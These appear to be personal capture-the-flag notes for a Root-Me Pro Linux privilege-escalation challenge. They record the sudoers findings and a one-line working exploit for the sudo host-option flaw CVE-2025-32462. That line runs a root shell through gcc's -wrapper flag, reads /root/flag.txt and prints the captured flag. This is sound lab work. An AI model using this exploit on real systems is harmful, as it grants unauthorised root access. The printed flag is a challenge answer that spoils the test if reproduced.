# Linux Privesc - CVE (Root-Me Pro) — notes

Target: ssh -p 32137 user@sockets.challenges.root-me.pro / password
Local user: uid=1000(user), hostname = `rmp`

## Findings
- sudoers (provided):
  - Host_Alias PROD = rmp ; Host_Alias PREPROD = preprod-rmp
  - `user PREPROD=(root:root) NOPASSWD:/usr/bin/gcc`  <-- only valid on preprod-rmp
- `sudo --version` -> 1.9.16p1 (vulnerable; fixed in 1.9.17p1)
- `sudo -n -l` -> "a password is required" (no rule matches on rmp)
- `sudo -n -h preprod-rmp -l` -> shows the (root:root) NOPASSWD /usr/bin/gcc rule => CVE-2025-32462 confirmed

## Exploit
echo "id; cat /root/flag.txt" | sudo -n -h preprod-rmp /usr/bin/gcc -wrapper /bin/sh,-s .
-> uid=0(root)
-> RM{d96dba59698e52e5674a73829364071a}

## Env notes
- passwordless sudo NOT working on this Kali VM right now (sshpass install failed) — used python3 paramiko (4.0.0, preinstalled) via solve.py instead.
- `sudo -l` without -n hangs over paramiko exec_command (waits on password prompt); always add -n.
